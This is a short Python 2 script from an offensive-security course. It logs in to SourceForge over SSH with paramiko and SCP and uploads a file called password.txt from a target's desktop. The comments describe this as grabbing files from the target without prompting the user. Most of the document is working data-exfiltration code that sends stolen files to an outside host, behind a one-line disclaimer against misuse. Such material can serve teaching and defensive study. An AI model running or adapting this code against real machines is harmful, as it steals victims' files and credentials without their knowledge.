'''
Caution
--------
Using this script for any malicious purpose is prohibited and against the law. Please read SourceForge terms and conditions carefully. 
Use it on your own risk. 
'''

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# Source Forge Docs
# http://sourceforge.net/p/forge/documentation/File%20Management/
# https://sourceforge.net/p/forge/documentation/SCP/


# Pycrypto: pycrypto-2.6.win32-py2.7   
# Download link:  http://www.voidspace.org.uk/python/modules.shtml#pycrypto


import paramiko     # pip install paramiko
import scp          # download link:  https://pypi.python.org/pypi/scp



ssh_client = paramiko.SSHClient()  # creating an ssh_client instance using paramiko sshclient class


'''
when you connect to an ssh server at the first time, if the ssh server keys are not stores on the client side, you will get a warning
message syaing that the server keys are not chached in the system and will promopt whether you want to accecpt those keys.

since we do an automation on the target side, we inform paramiko to accept these keys for the first time without interrupting the session or
prompting the user and this done via > set_missing_host_key_policy(paramiko.AutoAddPolicy()
'''

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())




ssh_client.connect("web.sourceforge.net", username="NAME", password="type your password") #Authenticate ourselves to the sourceforge server
print '[+] Authenticating against web.sourceforge.net ...'                                  #please use your own login credentials :D


scp = scp.SCPClient(ssh_client.get_transport())  #after a sucessful authentication the ssh session id will be passed into SCPClient function

scp.put('C:\\Users\\test\\Desktop\\password.txt') # upload to file( in this case it's password.txt) that we want to grab from the target to /root directroy
print '[+] File is uploaded '


scp.close()
print '[+] Closing the socket'








